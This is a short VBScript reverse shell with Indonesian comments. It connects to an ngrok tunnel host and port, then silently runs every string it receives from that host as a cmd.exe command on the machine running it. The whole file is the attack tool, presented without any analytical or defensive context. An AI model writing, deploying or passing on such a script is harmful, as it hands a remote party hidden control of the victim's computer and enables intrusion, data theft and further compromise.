Set objShell = CreateObject("WScript.Shell")
Set objTCP = CreateObject("MSWinsock.Winsock")

objTCP.RemoteHost = "0.tcp.ap.ngrok.io"  ' Ganti dengan host yang sesuai
objTCP.RemotePort = 14603                ' Ganti dengan port yang sesuai

objTCP.Connect

Do While objTCP.Connected
    strData = objTCP.ReceiveData
    If Len(strData) > 0 Then
        objShell.Run "cmd.exe /c " & strData, 0, True
    End If
Loop

objTCP.Close
